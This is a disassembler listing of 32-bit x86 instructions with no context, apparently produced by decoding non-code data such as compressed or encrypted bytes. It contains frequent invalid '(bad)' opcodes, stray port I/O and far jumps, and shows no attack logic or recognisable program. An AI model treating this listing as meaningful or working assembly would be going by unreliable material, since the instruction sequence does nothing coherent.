  422795:	out    0xf9,al
  422797:	xor    al,0x37
  422799:	repz add BYTE PTR [ecx],cl
  42279c:	fs cwde 
  42279e:	sbb    eax,0x9f3cdcbf
  4227a3:	out    0xad,al
  4227a5:	add    BYTE PTR [ecx],dh
  4227a7:	xchg   DWORD PTR [edx+0x47b945],esi
  4227ad:	pop    ecx
  4227ae:	inc    esi
  4227af:	call   0xcd6d:0x64add3e7
  4227b6:	jno    0x4227ae
  4227b8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4227ba:	sbb    DWORD PTR [ecx+0xe],edi
  4227bd:	loopne 0x4227da
  4227bf:	cmp    al,0x79
  4227c1:	inc    esi
  4227c2:	call   0xda26:0xc5353091
  4227c9:	xchg   ecx,eax
  4227ca:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4227cc:	sbb    DWORD PTR [ecx-0x11],edx
  4227cf:	popa   
  4227d0:	cld    
  4227d1:	arpl   WORD PTR [ebx+0x23],bp
  4227d4:	retf   
  4227d5:	or     al,0x4d
  4227d7:	jmp    0x97e92d84
  4227dc:	inc    edx
  4227dd:	ja     0x42280f
  4227df:	pusha  
  4227e0:	popa   
  4227e1:	sbb    DWORD PTR [ecx],0x74
  4227e4:	aas    
  4227e5:	test   BYTE PTR [eax],bh
  4227e7:	add    ah,bh
  4227e9:	(bad)  
  4227ea:	mov    dh,0xed
  4227ec:	in     al,dx
  4227ed:	mov    al,ds:0x88388126
  4227f2:	gs pop edi
  4227f4:	cli    
  4227f5:	mov    edx,0xb6d85c3c
  4227fa:	or     al,0x47
  4227fc:	pop    ss
  4227fd:	retf   
  4227fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ff:	sub    BYTE PTR [esi],dl
  422801:	mov    dl,0x7f
  422803:	and    al,dl
  422805:	inc    edx
  422806:	mov    ebx,0x24fd32d
  42280b:	setp   BYTE PTR [ecx+0x73]
  42280f:	xchg   edx,ecx
  422811:	lods   eax,DWORD PTR ds:[esi]
  422812:	out    0xed,al
  422814:	ret    0xdf57
  422817:	fld    QWORD PTR ds:0x5e0086bf
  42281d:	nop
  42281e:	pop    ds
  42281f:	inc    esi
  422820:	call   0xabba:0xfbff9b
  422827:	add    cl,dh
  422829:	jp     0x42282b
  42282b:	push   esi
  42282c:	mov    ebp,0x3c869200
  422831:	mov    bh,0xd8
  422833:	sbb    bh,BYTE PTR [ecx-0x65]
  422836:	or     ch,BYTE PTR [ecx-0x72501584]
  42283c:	sbb    edx,DWORD PTR [edi+0x437a6d1a]
  422842:	xchg   ecx,eax
  422843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422844:	xchg   esi,eax
  422845:	pop    ecx
  422846:	lock jno 0x4228b4
  422849:	pop    ss
  42284a:	mov    esi,0x8a1600cb
  42284f:	mov    bh,0x5f
  422851:	adc    DWORD PTR ds:0x98ef8a46,edi
  422857:	shl    BYTE PTR [esi-0x207c94e3],0x19
  42285e:	ret    
  42285f:	and    BYTE PTR [ecx],al
  422861:	mov    eax,gs
  422863:	fcomp  QWORD PTR [esi-0x2]
  422866:	(bad)  
  422867:	lahf   
  422868:	ret    
  422869:	add    BYTE PTR [ecx],dh
  42286b:	rol    BYTE PTR [eax],1
  42286d:	pushf  
  42286e:	xchg   ebp,eax
  42286f:	add    BYTE PTR [eax+edi*8+0x419d0060],dl
  422876:	mov    BYTE PTR [ebp+0x6c8b6216],bh
  42287c:	lahf   
  42287d:	inc    ebp
  42287e:	mov    ecx,0x64683f97
  422883:	mov    ebx,DWORD PTR [ebx-0x25]
  422886:	pop    edi
  422887:	ja     0x422818
  422889:	out    0x50,al
  42288b:	std    
  42288c:	call   DWORD PTR [edx]
  42288e:	dec    esp
  42288f:	xor    eax,0xd7295b6e
  422894:	ja     0x4228ce
  422896:	sub    bh,bh
  422898:	or     al,0xcf
  42289a:	gs stc 
  42289c:	xchg   edi,eax
  42289d:	pop    edi
  42289e:	adc    al,0xd8
  4228a0:	add    BYTE PTR [ecx+0x19],ah
  4228a3:	add    ah,cl
  4228a5:	mov    ecx,0x23cab17
  4228aa:	pop    ebx
  4228ab:	pop    ebx
  4228ac:	mov    eax,ds:0x69322c4a
  4228b1:	pop    ebx
  4228b2:	hlt    
  4228b3:	inc    esi
  4228b5:	jbe    0x42291b
  4228b7:	stc    
  4228b8:	pop    ecx
  4228b9:	sub    BYTE PTR [eax],al
  4228bb:	inc    esp
  4228bd:	sub    al,0x18
  4228bf:	das    
  4228c0:	leave  
  4228c1:	loope  0x422898
  4228c3:	push   0xa8728dc4
  4228c8:	cdq    
  4228c9:	sbb    al,dh
  4228cb:	fcmove st,st(0)
  4228cd:	repnz mov ecx,0xbc2e1f1f
  4228d3:	sub    eax,0x711d8879
  4228d8:	arpl   bx,bx
  4228da:	imul   esp,DWORD PTR ss:[edi+ebx*2-0x5d],0x90874d14
  4228e3:	ins    DWORD PTR es:[edi],dx
  4228e4:	ins    DWORD PTR es:[edi],dx
  4228e5:	fcmovnb st,st(0)
  4228e7:	mov    esp,0x600ceff
  4228ec:	and    DWORD PTR [esi+0x1bb05e5f],0x36
  4228f3:	or     dh,BYTE PTR [edi-0x4791a60a]
  4228f9:	and    eax,0xae1f6839
  4228fe:	add    bl,cl
  422900:	or     esi,DWORD PTR [edi+0x26ff5b91]
  422906:	and    al,al
  422908:	jg     0x422939
  42290a:	add    BYTE PTR ds:0x916db6a0,ah
  422910:	lods   eax,DWORD PTR ds:[esi]
  422911:	inc    ebx
  422912:	jg     0x42293c
  422914:	and    BYTE PTR [eax],bh
  422916:	mov    ecx,0xa01bda1c
  42291b:	jns    0x4228fe
  42291d:	aam    0xb5
  42291f:	fbld   TBYTE PTR [esi]
  422921:	add    BYTE PTR [esi-0x32c780e0],ch
  422927:	lods   eax,DWORD PTR ds:[esi]
  422928:	jl     0x42297d
  42292a:	out    0x0,al
  42292c:	jno    0x42292a
  42292e:	aas    
  42292f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422931:	add    BYTE PTR [eax+0x18],ch
  422934:	sub    al,0x72
  422936:	repz rol BYTE PTR [ebp+0xd7c97ed],cl
  42293d:	mov    edi,0xe8670063
  422942:	add    cl,ah
  422944:	lea    ebp,[edi+edi*2]
  422947:	out    0x52,eax
  422949:	jb     0x42290a
  42294b:	jo     0x42294d
  42294d:	std    
  42294e:	shr    BYTE PTR [edi],1
  422950:	mov    dh,0xa5
  422952:	ucomiss xmm2,DWORD PTR [edi]
  422955:	sbb    BYTE PTR [edi],dh
  422957:	pop    edi
  422958:	in     al,0xaa
  42295a:	enter  0xb4c8,0x8d
  42295e:	inc    edi
  42295f:	push   ss
  422960:	call   0x604186c4
  422965:	pop    eax
  422966:	add    BYTE PTR [edi],dh
  422968:	daa    
  422969:	(bad)  
  42296a:	in     eax,dx
  42296b:	mov    dh,0xb9
  42296d:	fdivr  DWORD PTR [edi-0x1b2882e6]
  422973:	jp     0x422967
  422975:	cmc    
  422976:	jmp    FWORD PTR [esi-0x31]
  422979:	in     eax,0xe6
  42297b:	data16 add BYTE PTR [esi-0x20],ch
  42297f:	add    cl,ch
  422981:	inc    edi
  422982:	jnp    0x422950
  422984:	pop    edi
  422985:	push   ecx
  422986:	add    BYTE PTR [eax-0x28],bl
  422989:	mov    bh,BYTE PTR [edi+ebx*4+0x77]
  42298d:	mov    al,ds:0xd924c449
  422992:	mov    al,ds:0xb2addb1
  422997:	sbb    DWORD PTR [edi+0x54],eax
  42299a:	aas    
  42299b:	mov    edi,0xb5f6dbe1
  4229a0:	sbb    al,0xb4
  4229a2:	adc    eax,0xf5e37f7a
  4229a7:	jnp    0x422986
  4229a9:	jl     0x4229ce
  4229ab:	sbb    edx,DWORD PTR [edi-0x20a00f49]
  4229b1:	add    BYTE PTR ds:0xa6ff558c,dh
  4229b7:	inc    eax
  4229b8:	sub    al,0x7c
  4229ba:	call   0x4fac:0x1f3f386a
  4229c1:	ror    DWORD PTR [eax-0x4972297f],0x7f
  4229c8:	sub    al,0x96
  4229ca:	fxtract 
  4229cc:	jo     0x42296d
  4229ce:	dec    eax
  4229d0:	jb     0x422a36
  4229d2:	mov    dh,0x6c
  4229d4:	jge    0x4229f8
  4229d6:	js     0x4229d8
  4229d8:	and    eax,ebp
  4229da:	add    ah,dl
  4229dc:	test   al,0x8d
  4229de:	fdivr  QWORD PTR [esp+ebp*1]
  4229e1:	mov    bh,0xdf
  4229e3:	fdiv   QWORD PTR [eax+eax*1+0x2c8c76b3]
  4229ea:	mov    al,0x2d
  4229ec:	mov    dh,0xee
  4229ee:	add    eax,0xa74c3f67
  4229f3:	(bad)  
  4229f4:	mov    dh,0xd5
  4229f6:	cs or  eax,0x434a1086
  4229fc:	pop    esp
  4229fd:	add    eax,0xbb6ddf44
  422a02:	jae    0x4229fd
  422a04:	jns    0x422a4e
  422a06:	add    BYTE PTR [ecx],bl
  422a08:	jp     0x422a54
  422a0a:	pop    edi
  422a0b:	popa   
  422a0c:	inc    esp
  422a0d:	mov    edi,0x35a96ddd
  422a12:	das    
  422a13:	mov    edi,0xd896003e
  422a18:	jge    0x4229dc
  422a1a:	into   
  422a1b:	cmc    
  422a1c:	add    DWORD PTR [ebp+0x64],esi
  422a1f:	mov    DWORD PTR [edi+0x38c76c1f],eax
  422a25:	sbb    esp,DWORD PTR [ebx]
  422a27:	or     esi,DWORD PTR [edx+ebx*8]
  422a2a:	lahf   
  422a2b:	lahf   
  422a2c:	push   eax
  422a2d:	sbb    al,0x3f
  422a2f:	loope  0x4229e2
  422a31:	lea    ebp,[esp+edx*4-0x34]
  422a35:	lahf   
  422a36:	test   al,0x4
  422a38:	pop    edi
  422a39:	jmp    0xb9876919
  422a3e:	scas   ax,WORD PTR es:[edi]
  422a40:	pop    ebp
  422a41:	pop    ds
  422a42:	fsubr  QWORD PTR [eax+0x4a]
  422a45:	jns    0x422a7c
  422a47:	in     al,0xc3
  422a49:	int    0x41
  422a4b:	pop    edi
  422a4c:	(bad)  
  422a4d:	cld    
  422a4e:	mov    al,0x1f
  422a50:	push   ebp
  422a51:	jle    0x422a1d
  422a53:	outs   dx,DWORD PTR ds:[esi]
  422a54:	pop    ebx
  422a55:	imul   ebx,ebx,0x5f3c6577
  422a5b:	add    eax,DWORD PTR [ecx]
  422a5d:	add    BYTE PTR [ecx+0x28],bh
  422a60:	xlat   BYTE PTR ds:[ebx]
  422a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a62:	push   0xc0642bb7
  422a67:	add    bh,BYTE PTR [edi-0x3f]
  422a6a:	loopne 0x422aeb
  422a6c:	ret    0xfcad
  422a6f:	ret    0xdfeb
  422a72:	jl     0x422ad4
  422a74:	add    BYTE PTR [esi-0x1e93a668],cl
  422a7a:	popf   
  422a7b:	rol    DWORD PTR [ebp-0x1b2c7a2a],0xb3
  422a82:	xor    DWORD PTR [edx],edi
  422a84:	fbstp  TBYTE PTR [ebp+0x6c]
  422a87:	in     eax,dx
  422a88:	(bad)  
  422a89:	add    DWORD PTR [eax-0x6442706a],ebx
  422a8f:	sub    BYTE PTR [esi+ebx*2],0xdb
  422a93:	(bad)  
  422a94:	mov    dh,0x6d
  422a96:	inc    edx
  422a97:	test   eax,0xe7322cf5
  422a9c:	test   ebp,ecx
  422a9e:	push   0xb6170b8c
  422aa3:	(bad)  
  422aa4:	jl     0x422a45
  422aa6:	xor    al,0x1a
  422aa8:	and    BYTE PTR [edx],0xc4
  422aab:	push   eax
  422aac:	test   eax,0xb8dbf20
  422ab1:	retf   
  422ab2:	add    ah,dl
  422ab4:	dec    edi
  422ab5:	jl     0x422ace
  422ab7:	pop    edx
  422ab8:	data16 jo 0x422b1d
  422abb:	xchg   ebx,eax
  422abc:	nop
  422abd:	popa   
  422abe:	popa   
  422abf:	imul   ebp,DWORD PTR [ebx-0x11],0x67a7bc32
  422ac6:	or     DWORD PTR cs:[edi+0x75a3631b],edx
  422acd:	dec    esi
  422ace:	jae    0x422b2b
  422ad0:	push   es
  422ad1:	stc    
  422ad2:	aas    
  422ad3:	lods   eax,DWORD PTR ds:[esi]
  422ad4:	gs or  ebx,esp
  422ad7:	fisubr DWORD PTR [ebp-0x67]
  422ada:	mov    eax,ds:0x29024abc
  422adf:	and    al,0x33
  422ae1:	push   es
  422ae2:	in     al,dx
  422ae3:	mov    al,0xdd
  422ae5:	push   ss
  422ae6:	sbb    ah,BYTE PTR [esi+0x7c]
  422ae9:	sub    al,cl
  422aeb:	aad    0xb1
  422aed:	repnz cld 
  422aef:	ins    DWORD PTR es:[edi],dx
  422af0:	mov    ebx,0x3d871035
  422af5:	push   eax
  422af6:	ins    BYTE PTR es:[edi],dx
  422af7:	mov    ah,0x1a
  422af9:	lods   al,BYTE PTR ds:[esi]
  422afa:	pop    edi
  422afb:	mov    dh,0x5b
  422afd:	fld    TBYTE PTR [esi+0x32]
  422b00:	pushf  
  422b01:	ins    DWORD PTR es:[edi],dx
  422b02:	jmp    0xa7a139cc
  422b07:	sub    BYTE PTR [edi],0xc
  422b0a:	in     eax,dx
  422b0b:	mov    dh,0x95
  422b0d:	xchg   esi,eax
  422b0e:	das    
  422b0f:	sub    ebx,DWORD PTR [eax-0x54107350]
  422b15:	xchg   edx,eax
  422b16:	sub    DWORD PTR [ebp+0x6c],ebp
  422b19:	mov    ah,0x8d
  422b1b:	mov    ecx,0x6ece9f0
  422b20:	jge    0x422b37
  422b22:	ins    DWORD PTR es:[edi],dx
  422b23:	pusha  
  422b24:	mov    ebx,0x6502b5b0
  422b29:	fild   WORD PTR [edi+0x1f]
  422b2c:	inc    edx
  422b2d:	cmp    esp,DWORD PTR [eax]
  422b2f:	cmp    bl,bl
  422b31:	mov    dh,0x5b
  422b33:	(bad)  [edi+0x36aa2fd5]
  422b39:	inc    ecx
  422b3a:	or     dl,BYTE PTR [ebp+0x1fc85071]
  422b40:	mov    ebx,DWORD PTR [ebx+0x26]
  422b43:	mov    ah,0xfe
  422b45:	aas    
  422b46:	icebp  
  422b47:	add    BYTE PTR [ebp-0x60],bl
  422b4a:	add    BYTE PTR [ebx],bl
  422b4c:	loopne 0x422b28
  422b4e:	cli    
  422b4f:	(bad)  
  422b50:	mov    esi,0x89f790
  422b55:	ja     0x422b73
  422b57:	(bad)  
  422b58:	div    DWORD PTR [edx-0x5f493d2f]
  422b5e:	xchg   ecx,eax
  422b5f:	fisttp QWORD PTR [edi]
  422b61:	ins    DWORD PTR es:[edi],dx
  422b62:	sub    eax,0x5918f07f
  422b67:	jmp    0x3f3f:0x2250ef36
  422b6e:	mov    ?,WORD PTR [eax]
  422b70:	inc    ebx
  422b71:	cs cmp al,0xdf
  422b74:	lahf   
  422b75:	and    eax,DWORD PTR [eax]
  422b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b78:	add    edx,DWORD PTR [ecx-0x6e398b81]
  422b7e:	lea    ebp,[esi]
  422b80:	ins    BYTE PTR es:[edi],dx
  422b81:	sahf   
  422b82:	sub    esp,DWORD PTR [esi+0x587f7b4a]
  422b88:	lea    ebp,[esi*4+0x5399e6d]
  422b8f:	and    edi,DWORD PTR [edi]
  422b91:	adc    dh,bh
  422b93:	sbb    ecx,DWORD PTR [ebx]
  422b95:	and    ebx,DWORD PTR [ebx]
  422b97:	ffreep st(0)
  422b99:	jo     0x422bcc
  422b9b:	xchg   ebx,eax
  422b9c:	lahf   
  422b9d:	sub    dl,dh
  422b9f:	sbb    BYTE PTR [esi+ebx*4+0x76],bl
  422ba3:	ret    0x30b9
  422ba6:	mov    edi,0x5bcf00f6
  422bab:	fs jmp 0x422b76
  422bae:	pop    eax
  422baf:	sbb    bh,BYTE PTR [ecx+0x6965761f]
  422bb5:	lock add BYTE PTR [ebx],cl
  422bb8:	mov    ah,0x6e
  422bba:	xlat   BYTE PTR ds:[ebx]
  422bbb:	dec    eax
  422bbc:	adc    BYTE PTR [edi],bl
  422bbe:	or     bh,BYTE PTR [ebx+0x34b1b1b4]
  422bc4:	and    al,0x15
  422bc6:	repnz add BYTE PTR [edi-0x32],bh
  422bca:	inc    esp
  422bcb:	out    dx,eax
  422bcc:	mov    edi,0xedc3fcfb
  422bd1:	jmp    0x422b8f
  422bd3:	nop
  422bd4:	mov    al,ds:0x9364df
  422bd9:	dec    ecx
  422bda:	cwde   
  422bdb:	arpl   bx,bx
  422bdd:	jecxz  0x422b94
  422bdf:	pop    ebx
  422be0:	lea    ebx,[ebx+0x4a]
  422be3:	jmp    0x7a9a41be
  422be8:	ret    
  422be9:	pop    ss
  422bea:	mov    esi,DWORD PTR [esi+0x595fb2fc]
  422bf0:	jnp    0x422b90
  422bf2:	add    al,cl
  422bf4:	xchg   edx,eax
  422bf5:	jne    0x422ba7
  422bf7:	(bad)  
  422bf8:	fsubr  DWORD PTR [eax]
  422bfa:	pop    ebp
  422bfb:	sbb    BYTE PTR [edi-0x5d],cl
  422bfe:	loopne 0x422c13
  422c00:	push   cs
  422c01:	repz cmp al,0xb
  422c04:	or     eax,0x1db55858
  422c09:	xchg   edi,eax
  422c0a:	retf   0x4651
  422c0d:	adc    ecx,edi
  422c0f:	into   
  422c10:	inc    edx
  422c11:	or     ebx,DWORD PTR [ebp+0x5f185f35]
  422c17:	pusha  
  422c18:	sbb    dh,BYTE PTR [edi+0x294a1b6d]
  422c1e:	lods   al,BYTE PTR ds:[esi]
  422c1f:	mov    dh,0xa6
  422c21:	adc    ecx,esp
  422c23:	and    DWORD PTR [edx],ebp
  422c25:	mov    dh,0xbe
  422c27:	cs sbb edi,ebx
  422c2a:	mov    edi,0x937f6c19
  422c2f:	test   DWORD PTR [esp+edi*1-0x6ee927a3],edx
  422c36:	mov    bh,0xc5
  422c38:	push   esp
  422c39:	pop    eax
  422c3a:	or     dl,al
  422c3c:	mov    edi,0x91b70fe4
  422c41:	(bad)  
  422c42:	daa    
  422c43:	in     eax,0x0
  422c45:	sub    al,0x65
  422c47:	xchg   ebp,eax
  422c48:	sbb    al,0x45
  422c4a:	pop    ds
  422c4b:	adc    esp,DWORD PTR [ecx+ecx*4+0x7]
  422c4f:	cs xchg esi,eax
  422c51:	cmp    bl,BYTE PTR [edi-0x521fe027]
  422c57:	fstp   QWORD PTR [esi]
  422c59:	je     0x422c92
  422c5b:	add    edi,DWORD PTR [edi-0x5f]
  422c5e:	shl    BYTE PTR [eax+0x2c],0x47
  422c62:	sbb    BYTE PTR [ecx-0x42],bl
  422c65:	les    edx,FWORD PTR [edi]
  422c67:	mov    bl,0x1f
  422c69:	lds    eax,FWORD PTR [eax]
  422c6b:	xchg   edx,eax
  422c6c:	(bad)  
  422c6e:	adc    al,0x18
  422c70:	fldcw  WORD PTR [edx+0x59]
  422c73:	fistp  QWORD PTR [eax+0x8a5bfad]
  422c79:	xchg   edi,eax
  422c7a:	ss rcl esi,cl
  422c7d:	(bad)  
  422c7e:	dec    BYTE PTR [eax+0x56cd745f]
  422c84:	dec    eax
  422c85:	in     eax,dx
  422c86:	rol    esi,0xc8
  422c89:	push   es
  422c8a:	pop    edi
  422c8b:	jns    0x422c55
  422c8d:	sbb    eax,DWORD PTR [ebp-0x1e]
  422c90:	ret    0x10d6
  422c93:	cmp    eax,0x370d74e3
  422c98:	js     0x422cc7
  422c9a:	sbb    eax,0x1f591e59
  422c9f:	test   al,0x88
  422ca1:	add    BYTE PTR [ecx],al
  422ca3:	test   al,0x94
  422ca5:	adc    al,dh
  422ca7:	ret    0xb6a5
  422caa:	pop    edi
  422cab:	mov    al,BYTE PTR ds:0x7daf8a1
  422cb1:	jb     0x422c52
  422cb3:	mov    dh,0x95
  422cb5:	(bad)  
  422cb7:	jmp    0xd254:0xc4c95f
  422cbe:	outs   dx,BYTE PTR ds:[esi]
  422cbf:	or     eax,0xed04f6e0
  422cc5:	mov    cl,0x75
  422cc7:	cmc    
  422cc8:	pop    edi
  422cc9:	and    al,0x6b
  422ccb:	cdq    
  422ccc:	sbb    dh,BYTE PTR [esi+0x6656e293]
  422cd2:	dec    edx
  422cd3:	stc    
  422cd4:	lock fbld TBYTE PTR [ecx+0x6db6c771]
  422cdb:	iret   
  422cdc:	or     eax,0xf978cbf
  422ce1:	or     ebx,eax
  422ce3:	pop    ss
  422ce4:	fistp  QWORD PTR [edi-0x372e41a4]
  422cea:	sbb    al,0xdc
  422cec:	fbld   TBYTE PTR [ecx+0x62d10048]
  422cf2:	xchg   BYTE PTR [ebp-0x3b0f4493],al
  422cf8:	fs mov ecx,0x92e7594c
  422cfe:	or     edi,esi
  422d00:	mov    al,ds:0x34817963
  422d05:	aas    
  422d06:	adc    BYTE PTR [eax],al
  422d08:	ins    BYTE PTR es:[edi],dx
  422d09:	pop    esp
  422d0a:	inc    DWORD PTR [ebx]
  422d0c:	dec    ebp
  422d0d:	pop    ebx
  422d0e:	sbb    ebx,DWORD PTR [ecx+0x3f]
  422d11:	enter  0x1d4b,0x41
  422d15:	mov    WORD PTR [edi-0x40],ds
  422d18:	in     al,0x65
  422d1a:	jmp    0x422d3c
  422d1c:	cmp    al,0x4
  422d1e:	jg     0x422d33
  422d20:	mov    al,ds:0x91f24900
  422d25:	sbb    edi,DWORD PTR [eax]
  422d27:	xor    BYTE PTR [edi+0x742008e],bl
  422d2d:	add    eax,0x8c6e0800
  422d32:	fcomp  QWORD PTR [eax+edi*8]
  422d35:	jl     0x422d37
  422d37:	add    eax,DWORD PTR [edi+0x3f]
  422d3a:	or     al,0x17
  422d3c:	shl    BYTE PTR [esi+0x69],0x7b
  422d40:	(bad)  
  422d41:	sbb    eax,0xcd5f2938
  422d46:	shl    DWORD PTR [eax-0x705a3c3],1
  422d4c:	xor    BYTE PTR [edi+edi*1],dh
  422d4f:	lahf   
  422d50:	push   edi
  422d51:	inc    edi
  422d52:	jo     0x422cfc
  422d54:	jg     0x422d0a
  422d56:	enter  0x8df2,0x66
  422d5a:	fistp  WORD PTR [edi]
  422d5c:	sbb    esp,edx
  422d5e:	add    BYTE PTR [edi],bh
  422d60:	and    al,0x83
  422d62:	or     esp,DWORD PTR [ebp-0x1d]
  422d65:	jecxz  0x422d7e
  422d67:	cmp    DWORD PTR [esi],ecx
  422d69:	(bad)  
  422d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d6c:	push   0x6d1b52c8
  422d71:	push   es
  422d72:	fimul  DWORD PTR [eax-0x29]
  422d75:	lahf   
  422d76:	clc    
  422d77:	jmp    0x200516e5
  422d7c:	popa   
  422d7d:	shl    BYTE PTR [ebp-0x4040e7aa],0x2c
  422d84:	and    eax,0x5d76b6dc
  422d89:	mov    dl,0x80
  422d8b:	inc    ecx
  422d8c:	js     0x422d93
  422d8e:	xlat   BYTE PTR ds:[ebx]
  422d8f:	dec    edx
  422d90:	(bad)  
  422d92:	sub    BYTE PTR [ecx+edi*8],bl
  422d95:	stc    
  422d96:	mov    ebp,0xebfee800
  422d9b:	pop    ds
  422d9c:	sub    DWORD PTR [esi],0xdada16bb
  422da2:	mov    dh,0x5f
  422da4:	mov    WORD PTR [ebp+ecx*2+0xb],es
  422da8:	outs   dx,BYTE PTR ds:[esi]
  422da9:	or     BYTE PTR [esi+edx*8+0x171fadb6],cl
  422db0:	sar    DWORD PTR [ecx-0x68],0x9f
  422db4:	inc    ebx
  422db5:	sti    
  422db6:	out    dx,al
  422db7:	in     al,dx
  422db8:	sahf   
  422db9:	adc    BYTE PTR [ebp-0x73],ch
  422dbc:	lock fistp DWORD PTR [ecx-0x6]
  422dc0:	pop    edi
  422dc1:	test   DWORD PTR fs:[edi],ebx
  422dc4:	mov    bh,0x28
  422dc6:	fs (bad) 
  422dc8:	lods   eax,DWORD PTR ds:[esi]
  422dc9:	jo     0x422d74
  422dcb:	cwde   
  422dcc:	push   esi
  422dcd:	mov    ecx,0xcce0a32
  422dd2:	lods   al,BYTE PTR ds:[esi]
  422dd3:	aas    
  422dd4:	in     eax,0xe4
  422dd6:	loope  0x422d9a
  422dd8:	imul   ebx,DWORD PTR [edi],0xffffffd5
  422ddb:	mov    BYTE PTR [edi-0x2f],bh
  422dde:	mov    ds:0x9e96da17,eax
  422de3:	ins    BYTE PTR es:[edi],dx
  422de4:	jnp    0x422d7e
  422de6:	push   ecx
  422de7:	mov    ecx,esi
  422de9:	pop    edi
  422dea:	je     0x422e50
  422dec:	xor    dl,BYTE PTR [eax]
  422dee:	pop    ecx
  422def:	ds in  al,0xe3
  422df2:	je     0x422d93
  422df4:	lea    edx,[ecx+0x6c10d89b]
  422dfa:	pop    ds
  422dfb:	in     al,dx
  422dfc:	add    BYTE PTR [ebx+0x36],dh
  422dff:	daa    
  422e00:	popa   
  422e01:	popa   
  422e02:	or     DWORD PTR fs:[edi-0x61],0x500d7f14
  422e0a:	pop    ds
  422e0b:	ins    BYTE PTR es:[edi],dx
  422e0c:	popa   
  422e0d:	(bad)  
  422e0e:	sbb    al,0x0
  422e10:	adc    eax,0x64007887
  422e15:	aas    
  422e16:	pushf  
  422e17:	sub    al,0x55
  422e19:	mov    WORD PTR cs:[edi+ebx*1+0x21],ds
  422e1e:	cld    
  422e1f:	aas    
  422e20:	jl     0x422e68
  422e22:	loopne 0x422dda
  422e24:	lea    ebx,[edi+0x71bf4877]
  422e2a:	mov    al,ds:0x91c46b9f
  422e2f:	lods   eax,DWORD PTR ds:[esi]
  422e30:	mov    esi,0xacbf0dc7
  422e35:	xor    ebp,esi
  422e37:	fld    TBYTE PTR [ebp-0x57]
  422e3a:	jae    0x422e8c
  422e3c:	pop    edi
  422e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e3e:	ja     0x422e59
  422e40:	push   0x69aa8794
  422e45:	stc    
  422e46:	fsub   QWORD PTR [edx+0x2c84a16d]
  422e4c:	lahf   
  422e4d:	hlt    
  422e4e:	in     al,0x64
  422e50:	arpl   WORD PTR [esi],ax
  422e52:	pop    esp
  422e53:	pop    ebx
  422e54:	fs hlt 
  422e56:	pop    edi
  422e57:	sub    ebx,DWORD PTR [ecx]
  422e59:	call   DWORD PTR [edi+0xfe47c87]
  422e5f:	add    dl,dh
  422e61:	push   edi
  422e62:	aad    0x0
  422e64:	mov    eax,0x3cbbb4
  422e69:	mov    ecx,0xb1918589
  422e6e:	jecxz  0x422e74
  422e70:	dec    esp
  422e71:	pop    ds
  422e72:	outs   dx,BYTE PTR ds:[esi]
  422e73:	add    BYTE PTR [ecx+0x1c2dad8d],ch
  422e79:	scas   eax,DWORD PTR es:[edi]
  422e7a:	popf   
  422e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e7c:	adc    BYTE PTR [edi+0x15a2d54a],bh
  422e82:	cs ins BYTE PTR es:[edi],dx
  422e84:	mov    ds,WORD PTR [eax-0x61]
  422e87:	mov    edi,0xeea3a6c1
  422e8c:	test   eax,0x2db8db6d
  422e91:	mov    edi,0x65f75029
  422e96:	pop    ebp
  422e97:	push   eax
  422e98:	retf   
  422e99:	out    0xe9,al
  422e9b:	test   BYTE PTR [edx-0x25],ch
  422e9e:	xchg   DWORD PTR [eax+0x1f],eax
  422ea1:	test   eax,0x9e5889f6
  422ea6:	pop    ds
  422ea7:	pop    edi
  422ea8:	cld    
  422ea9:	loop   0x422eeb
  422eab:	aas    
  422eac:	aas    
  422ead:	adc    al,0xc8
  422eaf:	xchg   esp,esp
  422eb1:	pusha  
  422eb2:	icebp  
  422eb3:	les    ecx,FWORD PTR [ecx-0x2fe02068]
  422eb9:	inc    DWORD PTR [ebp-0x26]
  422ebc:	jne    0x422e9e
  422ebe:	push   esp
  422ebf:	or     BYTE PTR [edi],bh
  422ec1:	pop    ds
  422ec2:	mov    WORD PTR [eax+0x5f],es
  422ec5:	inc    edx
  422ec6:	lods   al,BYTE PTR ds:[esi]
  422ec7:	and    esi,DWORD PTR [eax-0x6b603b9b]
  422ecd:	dec    eax
  422ece:	pop    ds
  422ecf:	fisttp WORD PTR [eax]
  422ed1:	inc    esp
  422ed2:	jp     0x422ef4
  422ed4:	aas    
  422ed5:	push   eax
  422ed6:	pop    edi
  422ed7:	lahf   
  422ed8:	sbb    BYTE PTR [eax],cl
  422eda:	xchg   edx,eax
  422edb:	out    dx,eax
  422edc:	cmp    al,0xf0
  422ede:	pop    edi
  422edf:	or     al,0x74
  422ee1:	ins    DWORD PTR es:[edi],dx
  422ee2:	fcomp  QWORD PTR [eax+0x5a]
  422ee5:	fist   DWORD PTR [bx]
  422ee8:	jmp    0xe7dcec41
  422eed:	pushf  
  422eee:	cwde   
  422eef:	mov    dh,0xc2
  422ef1:	mov    dh,0x5
  422ef3:	add    ch,BYTE PTR [ebx-0x52]
  422ef6:	inc    esi
  422ef7:	or     ch,ch
  422ef9:	out    dx,eax
  422efa:	(bad)  [esi-0x3268d3d2]
  422f00:	pop    esi
  422f01:	mov    ds:0x23ca70d1,eax
  422f06:	xchg   edi,eax
  422f07:	imul   esp,DWORD PTR [ebp-0x7d],0x5b
  422f0b:	popa   
  422f0c:	xor    DWORD PTR [edi+0x44],edi
  422f0f:	cwde   
  422f10:	int    0x6e
  422f12:	fadd   QWORD PTR [esi-0x17]
  422f15:	mov    BYTE PTR [esi+0x31],0xa5
  422f19:	leave  
  422f1a:	xor    BYTE PTR [ebx-0x12f4f9e3],al
  422f20:	mov    dl,0x79
  422f23:	sar    esi,0xf9
  422f26:	cmc    
  422f27:	aam    0x7a
  422f29:	cli    
  422f2a:	retf   0x6dba
  422f2d:	sbb    ebx,DWORD PTR [ebx-0xc]
  422f30:	pop    edi
  422f31:	xor    bh,bl
  422f33:	add    eax,0x7b2c3e8d
  422f38:	inc    ecx
  422f39:	jecxz  0x422f0d
  422f3b:	push   esi
  422f3c:	push   cs
